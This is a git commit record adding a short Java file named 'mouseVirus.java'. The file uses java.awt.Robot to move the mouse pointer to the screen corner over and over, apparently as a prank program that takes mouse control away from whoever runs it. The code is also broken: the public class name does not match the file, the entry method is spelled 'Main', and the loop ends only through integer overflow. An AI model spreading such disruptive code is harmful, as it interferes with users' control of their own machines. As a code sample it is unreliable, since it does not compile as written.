c33108d61549675f6b74ada9c5be69e83e3c7735
babycreeper189 <63827080+babycreeper189@users.noreply.github.com>
2020-05-16 11:43:08 -0400

    Create mouseVirus.java

---
+++ java/sorce/mouseVirus.java
@@ -0,0 +1,10 @@
+import java.awt.*;
+
+public class index {
+    public static void Main(String args[]) throws AWTException {
+        Robot r = new Robot();
+        for (int i = 0; i > -1; i++) {
+            r.mouseMove(0, 0);
+        }
+    }
+}
